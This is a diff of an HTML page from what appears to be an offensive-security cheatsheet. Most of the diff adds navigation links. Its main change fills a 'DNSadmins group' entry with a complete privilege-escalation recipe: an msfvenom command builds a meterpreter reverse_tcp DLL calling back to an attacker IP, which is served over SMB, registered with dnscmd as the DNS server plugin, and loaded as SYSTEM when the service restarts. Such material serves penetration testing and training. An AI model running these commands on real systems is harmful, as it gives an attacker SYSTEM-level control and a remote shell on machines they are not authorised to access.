@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-03-08T15:44:24 CET">
+<meta name="revised" content="2020-04-23T18:56:15 CEST">
 <title>DNSadmins group :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -203,6 +203,13 @@
         <div>
           <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/">
             Belati
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/">
+            sn0int
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -544,10 +551,10 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/recon-enumeration/services-enumeration/1721_vpn/" class="dd-item">
+      <li data-nav-id="/recon-enumeration/services-enumeration/1721_500_vpn/" class="dd-item">
         <div>
-          <a href="/recon-enumeration/services-enumeration/1721_vpn/">
-            1721 - VPN
+          <a href="/recon-enumeration/services-enumeration/1721_500_vpn/">
+            1721/500 - VPN
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -811,6 +818,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/web-attacks/attacking_apis/" class="dd-item">
+        <div>
+          <a href="/web-attacks/attacking_apis/">
+            Attacking APIs
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/network/" class="dd-item haschildren
@@ -1019,6 +1033,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/exploitation/ipv6/" class="dd-item">
+        <div>
+          <a href="/windows-systems/exploitation/ipv6/">
+            IPv6
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/privilege-escalation/" class="dd-item parent haschildren
@@ -1103,6 +1124,13 @@
         <div>
           <a href="/windows-systems/post-exploitation-techniques/searching_informations/">
             Searching Informations
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/post-exploitation-techniques/persistence/" class="dd-item">
+        <div>
+          <a href="/windows-systems/post-exploitation-techniques/persistence/">
+            Persistence
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1461,8 +1489,28 @@
     
     
     
-    <p>TODO</p>
+    <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If you control any account member of the &#34;DnsAdmin&#34; group</span>
+<span style="color:#75715e"># You can use it to privesc on the machine</span>
 
+<span style="color:#75715e"># It works by adding a malicious DLL loaded by the DNS service.</span>
+<span style="color:#75715e"># You have to restart the service and the DLL will be loaded as SYSTEM</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Generating the DLL</span>
+$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp <span style="color:#111">LHOST</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.10.14.28 <span style="color:#111">LPORT</span><span style="color:#f92672">=</span><span style="color:#ae81ff">5566</span> -f dll &gt; privesc.dll
+
+<span style="color:#75715e"># Host the DLL on a SMD server or upload it on the target machine</span>
+$ sudo smbserver.py MYSHARE /path/to/dll -smb2support
+
+<span style="color:#75715e"># On the target machine, update the DNS configuration and give it the DLL</span>
+PS &gt; dnscmd <span style="color:#ae81ff">10</span>.10.10.169 /config /serverlevelplugindll <span style="color:#8045ff">\\</span><span style="color:#ae81ff">10</span>.10.14.28<span style="color:#8045ff">\T</span>ESTLOL<span style="color:#8045ff">\p</span>rivesc.dll
+
+<span style="color:#75715e"># You can check if the DLL has been correctly loaded</span>
+PS &gt; Get-ItemProperty HKLM:<span style="color:#8045ff">\S</span>YSTEM<span style="color:#8045ff">\C</span>urrentControlSet<span style="color:#8045ff">\S</span>ervices<span style="color:#8045ff">\D</span>NS<span style="color:#8045ff">\P</span>arameters<span style="color:#8045ff">\ </span>-Name ServerLevelPluginDll
+
+<span style="color:#75715e"># Then restart the DNS service</span>
+PS &gt; sc.exe stop dns
+PS &gt; sc.exe query dns
+PS &gt; sc.exe start dns
+
+<span style="color:#75715e"># If the exploit worked you should get a meterpreter</span></code></pre></div>
 
     
     
